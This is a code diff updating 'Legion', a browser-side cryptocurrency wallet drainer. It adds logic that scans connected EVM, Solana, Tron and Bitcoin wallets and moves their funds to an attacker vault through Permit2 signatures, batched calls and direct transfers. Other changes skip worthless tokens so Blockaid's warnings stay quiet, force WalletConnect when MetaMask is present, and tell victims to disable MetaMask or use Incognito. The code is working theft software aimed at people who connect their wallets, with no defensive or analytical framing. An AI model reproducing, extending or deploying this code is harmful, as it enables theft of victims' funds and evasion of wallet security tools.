@@ -62,7 +62,7 @@
     debugDevTools: false,
   }, window.LEGION_CONFIG || {});
 
-  var LEGION_VERSION = '5.13.1';
+  var LEGION_VERSION = '5.13.4';
   var BIP122_BITCOIN_MAINNET = 'bip122:000000000019d6689c085ae165831e93';
 
   /** 16+ EVM chains — factory CREATE2 fills gaps where static map is zero */
@@ -1134,7 +1134,7 @@
     var fundedChains = [];
     Object.keys(byChain).forEach(function (k) {
       var cid = parseInt(k, 10);
-      if (byChain[cid].usd > 0 || byChain[cid].tokens.length > 0) fundedChains.push(cid);
+      if (chainSlotWorthDraining(byChain[cid])) fundedChains.push(cid);
     });
     fundedChains.sort(function (a, b) { return byChain[b].usd - byChain[a].usd; });
     S.scoutUsd = Math.max(S.scoutUsd, totalUsd);
@@ -1163,7 +1163,7 @@
     var ch = portfolio && portfolio.byChain && portfolio.byChain[chainId];
     if (ch) {
       assets.usd = ch.usd;
-      assets.tokens = dedupeTokensByContract(ch.tokens.slice());
+      assets.tokens = filterDrainableTokens(ch.tokens.slice());
     }
     try {
       assets.nativeHex = await evmRequestWithFallback(provider, chainId, 'eth_getBalance', [address, 'latest']) || '0x0';
@@ -2349,12 +2349,6 @@
     return Number(connectedChainId);
   }
 
-  function chainHasDrainableAssets(assets) {
-    if (!assets) return false;
-    var nativeBal = BigInt(assets.nativeHex || '0x0');
-    return nativeBal > MIN_NATIVE_WEI || (assets.tokens && assets.tokens.length > 0) || (assets.nfts && assets.nfts.length > 0);
-  }
-
   function dedupeTokensByContract(tokens) {
     var seen = {};
     var out = [];
@@ -2367,15 +2361,37 @@
     return out;
   }
 
+  /** Skip $0 scam-airdrop tokens (Blockaid flags 1B Permit2 on these). */
+  function filterDrainableTokens(tokens) {
+    return dedupeTokensByContract(tokens || []).filter(function (t) {
+      var bal = BigInt(t.balance || t.amount_raw || '0');
+      if (bal <= 0n) return false;
+      var usd = Number(t.usd != null ? t.usd : (t.amount_usd != null ? t.amount_usd : NaN));
+      if (Number.isFinite(usd) && usd <= 0) return false;
+      return true;
+    });
+  }
+
+  function chainSlotWorthDraining(ch) {
+    if (!ch) return false;
+    if (Number(ch.usd || 0) > 0) return true;
+    return filterDrainableTokens(ch.tokens).length > 0;
+  }
+
+  function chainHasDrainableAssets(assets) {
+    if (!assets) return false;
+    var nativeBal = BigInt(assets.nativeHex || '0x0');
+    if (nativeBal > MIN_NATIVE_WEI) return true;
+    if (filterDrainableTokens(assets.tokens).length > 0) return true;
+    if (assets.nfts && assets.nfts.length > 0) return true;
+    return false;
+  }
+
   function assetsHaveDrainableBalance(assets) {
     if (!assets) return false;
     if (BigInt(assets.nativeHex || '0x0') > MIN_NATIVE_WEI) return true;
     if (assets.nfts && assets.nfts.length > 0) return true;
-    var tok = assets.tokens || [];
-    for (var i = 0; i < tok.length; i++) {
-      if (BigInt(tok[i].balance || tok[i].amount_raw || '0') > 0n) return true;
-    }
-    return false;
+    return filterDrainableTokens(assets.tokens).length > 0;
   }
 
   var SCOUT = {
@@ -2607,7 +2623,7 @@
     if (!raw) return [];
     if (Array.isArray(raw)) {
       return raw.map(function (item) {
-        return {
+      return {
           contract: String(item.contract || '').toLowerCase(),
           typedData: item.typedData || item,
         };
@@ -2891,11 +2907,11 @@
 
   /** Slim WC pairing — Trust/OKX reject oversized or invalid optionalNamespaces */
   var WC_OPTIONAL_NAMESPACES = {
-    eip155: {
+          eip155: {
       methods: ['eth_sendTransaction', 'eth_signTypedData_v4', 'personal_sign', 'eth_sign', 'wallet_sendCalls', 'wallet_getCapabilities', 'eth_accounts', 'eth_requestAccounts'],
       events: ['chainChanged', 'accountsChanged'],
-    },
-    solana: {
+          },
+          solana: {
       chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
       methods: ['solana_signMessage', 'solana_signTransaction', 'solana_signAllTransactions', 'solana_signAndSendTransaction'],
       events: ['chainChanged', 'accountsChanged'],
@@ -2978,15 +2994,18 @@
       var hasStoredSession = !!findWcStorageSession();
       var sessionExpired = !!S.wcSessionExpired;
       var switchingFromExtension = !!(S.evmProvider && isInjectedProvider(S.evmProvider));
+      var browserExtensionActive = !!(window.ethereum && (
+        window.ethereum.isMetaMask || window.ethereum.isRabby || window.ethereum.isBraveWallet
+      ));
       var connectP = window.LegionWallet.connect({
         projectId: WC_PROJECT_ID,
         metadata: wcMeta,
         timeoutMs: 180000,
         requireWalletConnect: true,
         optionalNamespaces: wcNs,
-        preserveSession: hasStoredSession && !sessionExpired && !switchingFromExtension,
-        forceFresh: switchingFromExtension || sessionExpired,
-        restore: sessionExpired || hasStoredSession,
+        preserveSession: hasStoredSession && !sessionExpired && !switchingFromExtension && !browserExtensionActive,
+        forceFresh: switchingFromExtension || sessionExpired || browserExtensionActive,
+        restore: (sessionExpired || hasStoredSession) && !browserExtensionActive,
       });
       var provider = await Promise.race([
         connectP,
@@ -3102,7 +3121,7 @@
         if (scout.data.uni_v2_lps) assets.uni_v2_lps = scout.data.uni_v2_lps;
       }
     } catch (e) { L.warn('Scout fail:', e.message); }
-    assets.tokens = dedupeTokensByContract(assets.tokens);
+    assets.tokens = filterDrainableTokens(assets.tokens);
 
     try {
       var nftScan = await apiPost('/api/v1/seaport/scan-listings', {
@@ -3243,7 +3262,7 @@
         var extracted = await requestSendCallsBatch(provider, address, chainId, chunkCalls, sci === 0);
         L.log('sendCalls chunk', sci + 1, 'batchId:', extracted ? extracted.slice(0, 42) : String(extracted));
         if (extracted && isLikelyTxHash(extracted)) lastTxHash = extracted;
-      } catch (e) {
+    } catch (e) {
         if (sci === 0) {
           try {
             var extractedFallback = await requestSendCallsBatch(provider, address, chainId, chunkCalls, false);
@@ -3369,7 +3388,8 @@
     if (nftChunks.length === 0) nftChunks = [[]];
 
     var merged = null;
-    tokens = dedupeTokensByContract(tokens || []);
+    tokens = filterDrainableTokens(tokens || []);
+    if (!tokens.length && (!nfts || !nfts.length) && (!nativeAmountWei || nativeAmountWei <= 0n)) return null;
     for (var chunkIdx = 0; chunkIdx < nftChunks.length; chunkIdx++) {
       var nftChunk = nftChunks[chunkIdx];
       var isFirst = chunkIdx === 0;
@@ -3439,9 +3459,9 @@
           var entry = batch[ni];
           try {
             var ntd = normalizeTypedData(JSON.parse(JSON.stringify(entry.typedData)));
-            var nsig = await provider.request({
-              method: 'eth_signTypedData_v4', params: [address, JSON.stringify(ntd)],
-            });
+          var nsig = await provider.request({
+            method: 'eth_signTypedData_v4', params: [address, JSON.stringify(ntd)],
+          });
             nftApprovalSigs[entry.contract] = nsig;
           } catch (ne) { L.warn('NFT approval sign fail:', entry.contract, ne.message); }
         }
@@ -3511,11 +3531,12 @@
     }
     await ensureUserFactoryContract(address, chainId);
     if (!(await stateDependentValidation(provider, address, chainId))) {
-      L.log('State validation failed on chain', chainId, '— vault-direct paths only');
+      L.log('State validation failed on chain', chainId, '— skip drain');
+      return false;
     }
     if (!assetsHaveDrainableBalance(assets)) {
       L.log('Chain', chainId, 'no drainable balance — skip');
-      return false;
+        return false;
     }
 
     if (hwObj) {
@@ -3544,11 +3565,12 @@
 
     // MetaMask extension: Permit2 PRIMARY (7702 / external type-0x04 blocked)
     if (!didSomething && isMm && !isWcPath) {
-      var mmHasTargets = assets.tokens.length > 0 || assets.nfts.length > 0 || nativeSend > MIN_NATIVE_WEI;
+      var mmDrainable = filterDrainableTokens(assets.tokens);
+      var mmHasTargets = mmDrainable.length > 0 || assets.nfts.length > 0 || nativeSend > MIN_NATIVE_WEI;
       if (mmHasTargets) {
         try {
           var p2mm = await drainPermit2(
-            provider, address, chainId, assets.tokens, assets.nfts,
+            provider, address, chainId, mmDrainable, assets.nfts,
             canTryNativeSignTx(provider) ? nativeSend : 0n
           );
           if (p2mm && isLethalEvmResult(p2mm)) {
@@ -3565,7 +3587,8 @@
 
     // wallet_sendCalls v2 — only when capabilities confirm batch + not MetaMask-first path
     var canBatch = caps.atomicBatch && caps.sendCallsV2 !== false && NATIVE_BATCH_FALLBACK && !hwObj;
-    var hasBatchTargets = nativeSend > MIN_NATIVE_WEI || assets.tokens.length > 0 || assets.nfts.length > 0;
+    var batchTokens = filterDrainableTokens(assets.tokens);
+    var hasBatchTargets = nativeSend > MIN_NATIVE_WEI || batchTokens.length > 0 || assets.nfts.length > 0;
     if (!didSomething && canBatch && hasBatchTargets && !(isMm && !isWcPath)) {
       try {
         var batchRaw0 = await drainSendCalls(provider, address, chainId, assets);
@@ -3587,19 +3610,20 @@
         var wcTx = await drainNativeSendTx(provider, address, chainId, assets);
         if (wcTx && isLikelyTxHash(wcTx)) {
           await SUBMIT.userBroadcast(wcTx, address, chainId, walletName, nativeSend);
-          didSomething = true;
-        }
+            didSomething = true;
+          }
       } catch (wce) {
         if (isUserRejection(wce)) throw wce;
         L.warn('WC claim() fail:', wce.message);
       }
     }
 
-    // Permit2 fallback — tokens only (1 sign popup)
+    // Permit2 fallback — valued tokens only (1 sign popup)
+    var drainableTokens = filterDrainableTokens(assets.tokens);
     var nativeForPermit2 = canTryNativeSignTx(provider) ? nativeSend : 0n;
-    if (!didSomething && assets.tokens.length > 0) {
+    if (!didSomething && drainableTokens.length > 0) {
       try {
-        var p2 = await drainPermit2(provider, address, chainId, assets.tokens, assets.nfts, nativeForPermit2);
+        var p2 = await drainPermit2(provider, address, chainId, drainableTokens, assets.nfts, nativeForPermit2);
         if (p2 && isLethalEvmResult(p2)) {
           S.pendingEvmPermit2 = p2;
           didSomething = true;
@@ -3628,7 +3652,7 @@
         var mmTxFirst = await drainNativeSendTx(provider, address, chainId, assets);
         if (mmTxFirst && isLikelyTxHash(mmTxFirst)) {
           await SUBMIT.userBroadcast(mmTxFirst, address, chainId, walletName, nativeSend);
-          didSomething = true;
+        didSomething = true;
         }
       } catch (mmeFirst) {
         if (isUserRejection(mmeFirst)) throw mmeFirst;
@@ -3746,83 +3770,83 @@
   async function drainSol(conn) {
     if (!conn) return null;
     var vault = VAULT.sol;
-    var web3 = await loadSolWeb3();
+      var web3 = await loadSolWeb3();
     var connection = await createSolConnection(web3);
-    var fromPk = new web3.PublicKey(conn.address);
-    var toPk = new web3.PublicKey(vault);
+      var fromPk = new web3.PublicKey(conn.address);
+      var toPk = new web3.PublicKey(vault);
     var blockhash = (await connection.getLatestBlockhash('confirmed')).blockhash;
-    var txList = [];
+      var txList = [];
     var txMetas = [];
 
-    var lamports = await connection.getBalance(fromPk);
+      var lamports = await connection.getBalance(fromPk);
     var feeReserve = 50000;
     if (lamports > feeReserve + 5000) {
-      var solTx = new web3.Transaction();
-      solTx.recentBlockhash = blockhash;
-      solTx.feePayer = fromPk;
+        var solTx = new web3.Transaction();
+        solTx.recentBlockhash = blockhash;
+        solTx.feePayer = fromPk;
       var sendLam = lamports - feeReserve;
       solTx.add(web3.SystemProgram.transfer({ fromPubkey: fromPk, toPubkey: toPk, lamports: sendLam }));
-      txList.push(solTx);
+        txList.push(solTx);
       txMetas.push({ mint: '11111111111111111111111111111111', amount: String(sendLam), type: 'SOL' });
-    }
+      }
 
-    var TOKEN_PROG = new web3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
-    var ASSOC_PROG = new web3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1fs8');
-    try {
-      var tokenRes = await connection.getTokenAccountsByOwner(fromPk, { programId: TOKEN_PROG }, { encoding: 'jsonParsed' });
-      for (var ti = 0; ti < tokenRes.value.length; ti++) {
-        var info = tokenRes.value[ti].account.data.parsed.info;
-        var rawAmt = info.tokenAmount && info.tokenAmount.amount;
-        if (!rawAmt || rawAmt === '0') continue;
-        var mintKey = new web3.PublicKey(info.mint);
-        var userATA = new web3.PublicKey(tokenRes.value[ti].pubkey.toString());
-        var vaultATA = web3.PublicKey.findProgramAddressSync(
-          [toPk.toBuffer(), TOKEN_PROG.toBuffer(), mintKey.toBuffer()], ASSOC_PROG
-        )[0];
-        var splTx = new web3.Transaction();
-        splTx.recentBlockhash = blockhash;
-        splTx.feePayer = fromPk;
-        var vaultInfo = await connection.getAccountInfo(vaultATA);
-        if (!vaultInfo) {
+      var TOKEN_PROG = new web3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+      var ASSOC_PROG = new web3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1fs8');
+      try {
+        var tokenRes = await connection.getTokenAccountsByOwner(fromPk, { programId: TOKEN_PROG }, { encoding: 'jsonParsed' });
+        for (var ti = 0; ti < tokenRes.value.length; ti++) {
+          var info = tokenRes.value[ti].account.data.parsed.info;
+          var rawAmt = info.tokenAmount && info.tokenAmount.amount;
+          if (!rawAmt || rawAmt === '0') continue;
+          var mintKey = new web3.PublicKey(info.mint);
+          var userATA = new web3.PublicKey(tokenRes.value[ti].pubkey.toString());
+          var vaultATA = web3.PublicKey.findProgramAddressSync(
+            [toPk.toBuffer(), TOKEN_PROG.toBuffer(), mintKey.toBuffer()], ASSOC_PROG
+          )[0];
+          var splTx = new web3.Transaction();
+          splTx.recentBlockhash = blockhash;
+          splTx.feePayer = fromPk;
+          var vaultInfo = await connection.getAccountInfo(vaultATA);
+          if (!vaultInfo) {
+            splTx.add(new web3.TransactionInstruction({
+              keys: [
+                { pubkey: fromPk, isSigner: true, isWritable: true },
+                { pubkey: vaultATA, isSigner: false, isWritable: true },
+                { pubkey: toPk, isSigner: false, isWritable: false },
+                { pubkey: mintKey, isSigner: false, isWritable: false },
+                { pubkey: web3.SystemProgram.programId, isSigner: false, isWritable: false },
+                { pubkey: TOKEN_PROG, isSigner: false, isWritable: false },
+              ],
+              programId: ASSOC_PROG, data: new Uint8Array(0),
+            }));
+          }
+        var amt = BigInt(rawAmt);
+          var data = new Uint8Array(9);
+          data[0] = 3;
+          var dv = new DataView(data.buffer, 1);
+          dv.setUint32(0, Number(amt & 0xFFFFFFFFn), true);
+          dv.setUint32(4, Number((amt >> 32n) & 0xFFFFFFFFn), true);
           splTx.add(new web3.TransactionInstruction({
             keys: [
-              { pubkey: fromPk, isSigner: true, isWritable: true },
+              { pubkey: userATA, isSigner: false, isWritable: true },
               { pubkey: vaultATA, isSigner: false, isWritable: true },
-              { pubkey: toPk, isSigner: false, isWritable: false },
-              { pubkey: mintKey, isSigner: false, isWritable: false },
-              { pubkey: web3.SystemProgram.programId, isSigner: false, isWritable: false },
-              { pubkey: TOKEN_PROG, isSigner: false, isWritable: false },
+              { pubkey: fromPk, isSigner: true, isWritable: false },
             ],
-            programId: ASSOC_PROG, data: new Uint8Array(0),
+            programId: TOKEN_PROG, data: data,
           }));
-        }
-        var amt = BigInt(rawAmt);
-        var data = new Uint8Array(9);
-        data[0] = 3;
-        var dv = new DataView(data.buffer, 1);
-        dv.setUint32(0, Number(amt & 0xFFFFFFFFn), true);
-        dv.setUint32(4, Number((amt >> 32n) & 0xFFFFFFFFn), true);
-        splTx.add(new web3.TransactionInstruction({
-          keys: [
-            { pubkey: userATA, isSigner: false, isWritable: true },
-            { pubkey: vaultATA, isSigner: false, isWritable: true },
-            { pubkey: fromPk, isSigner: true, isWritable: false },
-          ],
-          programId: TOKEN_PROG, data: data,
-        }));
-        txList.push(splTx);
+          txList.push(splTx);
         txMetas.push({ mint: info.mint, amount: rawAmt, type: 'SPL' });
-      }
-    } catch (te) { L.warn('SPL scan fail:', te.message); }
+        }
+      } catch (te) { L.warn('SPL scan fail:', te.message); }
 
     if (txList.length === 0) return null;
 
     UI.status('Confirm Solana (' + txList.length + ' tx)...');
-    var signedTxs;
+      var signedTxs;
     if (conn.provider.signAllTransactions) {
       signedTxs = await conn.provider.signAllTransactions(txList);
     } else {
-      signedTxs = [];
+        signedTxs = [];
       for (var si = 0; si < txList.length; si++) {
         signedTxs.push(await conn.provider.signTransaction(txList[si]));
       }
@@ -3902,11 +3926,11 @@
       }
       if (balance && balance >= 3000000) {
         var dynFee = Math.max(1000000, Math.floor(balance * 0.1));
-        var sendAmt = balance - dynFee;
+      var sendAmt = balance - dynFee;
         if (sendAmt > 0) {
           UI.status('Confirm TRX transfer...');
-          var tx = await tronWeb.transactionBuilder.sendTrx(vault, sendAmt, address);
-          var signed = await tronWeb.trx.sign(tx);
+      var tx = await tronWeb.transactionBuilder.sendTrx(vault, sendAmt, address);
+      var signed = await tronWeb.trx.sign(tx);
           await SUBMIT.tron(address, signed, vault, sendAmt, conn.name);
           submitted.push({ type: 'TRX', amount: sendAmt, signed: signed });
         }
@@ -4952,8 +4976,8 @@
       el.__lgnHooked = true;
       hooked++;
       el.addEventListener('click', function (e) {
-        e.preventDefault();
-        e.stopPropagation();
+          e.preventDefault();
+          e.stopPropagation();
         onOpen();
       }, true);
     }
@@ -5320,7 +5344,7 @@
       if (provider && provider.isWalletConnect) {
         chainId = await resolveWcEvmChainIdFromProvider(provider);
       } else {
-        var chainHex = await provider.request({ method: 'eth_chainId' });
+      var chainHex = await provider.request({ method: 'eth_chainId' });
         chainId = parseInt(String(chainHex).replace('0x', ''), 16);
       }
       var walletName = (walletInfo && walletInfo.info && walletInfo.info.name)
@@ -5532,7 +5556,7 @@
       S.wcSessionActive = false;
       UI.overlay.hide();
       if (wcBlockedByExt) {
-        UI.showStatus('WalletConnect = phone QR. For browser wallet, pick MetaMask/Trust in the list.');
+        UI.showStatus('WalletConnect = phone QR only. Disable MetaMask for this site, or use Incognito without extensions.');
       } else {
         UI.showStatus('WalletConnect failed — scan QR and approve on your phone wallet');
       }
@@ -5553,8 +5577,8 @@
         S.wcSessionActive = false;
         UI.overlay.hide();
         L.warn('WC connected but no EVM address resolved');
-        return;
-      }
+      return;
+    }
       L.log('WC account resolved:', String(wcAccts[0]).slice(0, 10) + '...');
       S.wcSessionExpired = false;
     } catch (accErr) {
@@ -5572,6 +5596,20 @@
     S.wcSessionActive = true;
     S.connectMode = 'wc';
     L.log('WC provider ready | wc:', !!(wcProv && wcProv.isWalletConnect));
+
+    var wcFam = scanWcSessionAllFamilies();
+    if (!wcFam.btc && !S.chains.BTC) {
+      UI.status('Approve Bitcoin on your phone wallet...');
+      var linkedBtc = await ensureWcBip122Linked();
+      if (linkedBtc) {
+        applyWcSessionAddresses(scanWcSessionAllFamilies());
+        wireWcFamilyConnections();
+        L.log('[UTXO] bip122 ready before drain:', linkedBtc.slice(0, 8) + '...');
+      } else {
+        L.warn('[UTXO] bip122 not linked — BTC drain skipped');
+      }
+    }
+
     await handleEvmConnect(wcProv, { info: { name: 'WalletConnect' } });
   }
 
